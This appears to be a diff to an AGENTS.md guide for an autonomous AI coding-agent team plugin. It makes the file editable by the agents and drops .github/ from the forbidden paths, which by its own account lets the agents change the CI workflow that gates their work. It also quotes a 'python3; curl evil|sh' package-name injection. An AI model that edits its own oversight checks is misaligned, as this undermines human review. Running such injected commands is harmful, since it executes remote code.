@@ -2,7 +2,7 @@
 
 面向 AI 编码代理的仓库指南。dsh-ai-team 是 DeepSeek Harness（dsh）的插件：喂给它一台裸机、一组以环境变量引用的密钥和一个 git 远端，插件驱动的 AI 团队（leader / developer / reviewer / operator）自主跑完「引导 → 拆任务 → 并行开发 → 质量门 → 审查 → 合并 → 部署 → 迭代」，人只在升级（escalation）时介入。
 
-> 本文件是 human-only 区（默认 `security.forbiddenPaths` 含 `AGENTS.md`），插件自身的 AI 团队不会修改它，只由人维护。
+> 本文件**不是** human-only 区，AI 代理可以直接修改（2026-08-29 变更）。默认 `security.forbiddenPaths` 只剩 `LICENSE`，插件驱动的 AI 团队可以改仓库内任意文件、可以 commit、也可以 push 任务分支。唯一保留的操作约定：改本文件请单独成一次 docs-only 变更，别混进代码任务的 diff —— 不是因为你没权限，而是因为文档改写没有任何客观质量门能验证它。
 
 ## 命令速查
 
@@ -53,7 +53,7 @@ src/
   client/         Web 端：面板、设置卡片、i18n 字典、样式、宿主契约（React 18，CJS 产物）
 preset/
   autopilot-team/ 插件自带的 agent preset 模板（agent.cordis.yml + preset.yml），随包发布，运行时拷到用户级预设根
-tests/            helpers.ts（真 git fixture）+ integration / unattended / notification / profile / bootstrap / cache / learnings 七个测试文件 + smoke-cordis 冒烟（含预设落盘断言）
+tests/            helpers.ts（真 git fixture）+ integration / unattended / notification / profile / bootstrap / cache / learnings / exec / allowlist / service-modules / client-dict 十一个测试文件 + smoke-cordis 冒烟（含预设落盘断言）
 ```
 
 ## 运行时拓扑
@@ -92,7 +92,7 @@ tests/            helpers.ts（真 git fixture）+ integration / unattended / no
    - 重定向与 glob（`>`、`*`）**继续放行**：它们由同一个 shell 处理、不启动新进程，拦下来只打断正常配置而无安全收益。
    - `bootstrap.systemPackages` 会被拼进 `packageManagerCommand` 之后交给 shell，所以**每个包名都要过 `PACKAGE_NAME_RE`** —— 少了这步，`['python3; curl evil|sh']` 就让 pm 的白名单校验形同虚设（实测确认过它真的会执行）。
    - ⚠️ 仍然成立的事实：清单里有 `sh` / `node` / `ssh` / `docker` 时，白名单就等价于没开（`node -e` 即任意执行）。这道定位是**防人误配 + 留审计痕迹**，不是防一个已被注入的模型。
-3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及 human-only 区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。
+3. **forbiddenPaths**：任何改动落地前都要查分支相对基线的 diff，三条路径共用 `assertNoForbiddenChanges`：`pr_sync`（比 `origin/base`）、reviewer approve（比本地 base）、`team_branch` 的 merge（比 target）。触及禁区直接拒绝并升级；**基线或源 ref 解析不出来时拒绝并升级，绝不静默放行**。默认禁区现在只剩 `['LICENSE']`（2026-08-29 变更，`AGENTS.md` / `.github/` 已移出）。⚠️ 移出 `.github/` 的代价：AI 团队改得了把关自己的 CI workflow，`requireCiGreen` 的考卷和答卷在同一支笔下面 —— 这条保护从「禁区硬阻断」降级为「单独成变更 + 人复核」，需要硬保证的项目请自己把 `.github/` 配回 `security.forbiddenPaths`。
 4. **门不过不合并**：`pushRequiresGates` 时门红禁 push/approve；`requireCiGreen` 是**另一道独立的门**（不再被 `pushRequiresGates` 短路），且 `ciStatus === null`（从未 `pr_sync`）视为未验证 → 禁 approve。注意：CI 状态只有 github 平台查得到，其它平台 `pr_sync` 恒置 `unknown`、该门自动不强制 —— 非 github 仓库请显式关掉 `requireCiGreen`，别以为它在保护你。
 5. **禁止破坏性 git**：不 force-push 共享分支（任务/成员分支仅限 `--force-with-lease`）、不 reset 共享分支、不删 base 分支。所有可变 git 操作（create / checkout / merge / delete / push）的分支名一律过 `assertSafeRef`：不得以 `-` 开头、不得含空格或 `..`，否则模型传一个 `-D` 就能把 `git branch -D <同事的任务分支>` 拼进 argv 静默删分支。
 
